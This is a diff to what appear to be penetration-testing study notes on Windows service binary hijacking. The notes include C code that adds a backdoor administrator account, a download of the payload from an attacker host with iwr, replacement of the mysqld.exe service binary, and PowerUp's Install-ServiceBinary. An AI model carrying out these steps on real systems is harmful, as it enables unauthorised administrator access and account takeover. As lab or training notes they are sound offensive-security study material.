@@ -11,7 +11,7 @@ in some instances software services may be tied to binaries that are given open 
 
 ### NOTE: when using a network logon like - WinRM or a bind shell these commands Get-CimInstance and Get-Service will not have permissions if the user does not have admin privs but RDP can get around this
 
-to list the services with their corresponding path
+to list the services with their corresponding path - if rdp to target
 
     PS > Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
@@ -34,6 +34,8 @@ for this example we will create compile an executable that adds a user with the 
     i = system ("net user user2 password123! /add");
     i = system ("net localgroup administrators user2 /add");
 
+### of course running as system we can do many things like edit existing users passwords to access their system
+
 since we have access to the target machine we will copy the binary over
 
     PS > iwr -uri http://192.168.1.1/adduser.exe -Outfile adduser.exe
@@ -46,7 +48,7 @@ and then copy our binary over
 
     PS > move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
 
-finally we need to restart the service which can be achieved several ways if priveleges permit
+finally we need to restart the service which can be achieved several ways if priveleges permit - but if we are running as a regular user /no sys then restart is our best bet
 
     PS > net stop mysql
 
@@ -64,6 +66,8 @@ once rebooted the malicious service should be running and we can check to see if
 
 #### PowerUp service hijacking
 
+    $ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+
 now let's use a powershell script to see if it can detect these binaries that can be replaced
 
     $ python3 -m http.server 80
@@ -76,13 +80,15 @@ copying the script over
 
 ep bypsass to execute the script
 
-    PS > ./PowerUp.ps1
+    PS > . .\PowerUp.ps1
 
     PS > Get-ModifiableServiceFile
 
 this will identify writeable services - then we can even attempt to overwrite them with PowerUp
 
     PS > Install-ServiceBinary -Name 'mysql'
+
+may need to stop service before executing Install-ServiceBinary - net stop service
 
 ### NOTE: this functionality of the script may fail so should be verified manually
 
